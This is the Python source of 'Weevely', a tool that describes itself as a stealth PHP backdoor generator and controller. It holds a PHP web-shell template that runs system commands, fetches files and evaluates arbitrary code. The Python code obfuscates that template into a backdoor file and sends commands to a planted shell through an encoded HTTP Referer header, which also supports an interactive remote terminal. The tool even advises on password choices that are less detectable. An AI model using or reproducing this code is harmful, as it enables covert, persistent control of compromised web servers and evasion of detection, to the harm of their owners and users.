# -*- coding: utf-8 -*-

from numpy import frombuffer, bitwise_xor, byte
import getopt, sys, base64, os, urllib2, re, urlparse
    
    
    
#e = re.compile("=(.*)")
#print e.findall("?asd=cu&asd2=cu2&asd3=cu3")[0]    


back="""
$ref[1] = base64_decode($ref[1]);
switch($ref[2]){
	case 0:
		system($ref[1]." 2>&1");
		break;
	case 1:
		$cmd = explode(' ', $ref[1]);
		echo file_put_contents($cmd[1], file_get_contents($cmd[0]))."\n";
		break;
	case 2:
		@eval($ref[1]);
		break;
}
"""


class weevely:
  def main(self):
    
    self.banner()
  
    try:
	opts, args = getopt.getopt(sys.argv[1:], 'tgc:u:p:o:', ['generate', 'url', 'password', 'terminal', 'command', 'output'])
    except getopt.error, msg:
	print "Error:", msg
	exit(2)
    
    for o, a in opts:
	if o in ("-g", "-generate"):
	  mode='g'
	if o in ("-t", "-terminal"):
	  mode='t'
	if o in ("-c", "-command"):
	  cmnd=a
	  mode='c'
	  
	if o in ("-u", "-url"):
	  url=a
	  parsed=urlparse.urlparse(url)
	  if not parsed.scheme:
	    url="http://"+url
	  if not parsed.netloc:
	    print "- Error: URL not valid"
	    sys.exit(1)
	  
	if o in ("-p", "-password"):
	  pwd=a
	if o in ("-o", "-output"):
	  outfile=a

    if 'mode' in locals():

      if mode=='c' or mode=='t':
	if 'url' not in locals():
	  print "! Please specify URL (-u)"
	  sys.exit(1)
	  
      if mode=='g':
	if 'outfile' not in locals():
	  print "! Please specify where generate backdoor file (-o)"
	  sys.exit(1)

      if 'pwd' not in locals():
	if mode=='g':
	  print "+ Random alphanumeric password (like 'a33k44') are less detectable."
	print "+ Please insert password: ",
	pwd = sys.stdin.readline()

	

      if mode=='c': 
	self.execute(url,pwd,cmnd,mode)
      if mode=='t':
	self.terminal(url,pwd,mode)
      if mode=='g':
	self.generate(pwd,outfile)
    else:
      self.usage()
      sys.exit(1)

  def usage(self):
    print """+  Generate backdoor code in <filepath>, using <password>.
+  	./weevely -g -o <filepath> -p <password>
+      
+  Execute remote <command> via <url>, using <password>.
+  	./weevely -c <command> -u <url> -p <password>
+      
+  Execute remote terminal via <url>, using <password>.
+  	./weevely -t -u <url> -p <password>"""
    
  def banner(self):
    print "+ Weevely - stealth PHP backoor generator and controller.\n+\t\t\tEmilio Pinna & Carlo Satta.\n+"

     
  def crypt(self, text, key):
    #return (($text ^ str_pad("", strlen($text), $key)) & str_repeat("\x1f", strlen($text))) | ($text & str_repeat("\xe0", strlen($text)));
    text = frombuffer( text, dtype=byte )
    firstpad=frombuffer(( key*(len(text)/len(key)) + key)[:len(text)], dtype=byte)
    strrepeat=frombuffer( '\x1f'*len(text), dtype=byte)
    strrepeat2=frombuffer( '\xe0'*len(text), dtype=byte)
    
    bit=((text ^ firstpad) & strrepeat ) | ( text & strrepeat2 )
    
    toret = base64.b64encode(bit.tostring())
    return toret 

  def execute(self, url, pwd, cmnd, mode):
    cmnd=cmnd.strip()
    cmdstr=self.crypt(cmnd,pwd)
    refurl='http://www.google.com/asdsds?dsa=' + pwd + '&asd=' + cmdstr + '&asdsad=' + str(mode)
    try: 
      ret=self.execHTTPGet(refurl,url)
    except urllib2.URLError, e:
      return str(e.reason)
    else: 
      restring='<' + pwd + '>(.*)</' + pwd + '>'
      e = re.compile(restring,re.DOTALL)
      print e.findall(ret)[0]
    
  def execHTTPGet(self, refurl, url):
    req = urllib2.Request(url)
    req.add_header('Referer', refurl)
    r = urllib2.urlopen(req)
    return r.read()
    
  def terminal(self, url, pwd, mode):
    print '+ Backdoor verification...',
    ret = self.execute(url, pwd, "echo " + pwd, mode)
    if (ret is not pwd):
      print 'failed: ' + ret
    else:	
      print 'succeeded.' 
      while True:
	print "> ",
	cmnd = sys.stdin.readline()
	if cmnd!='\n':
	  self.execute(url, pwd, cmnd, mode)
	  
  def generate(self,key,path):
    print self.crypt(back,key)
    
if __name__ == "__main__":
    
    app=weevely()
    app.main()
    
    
   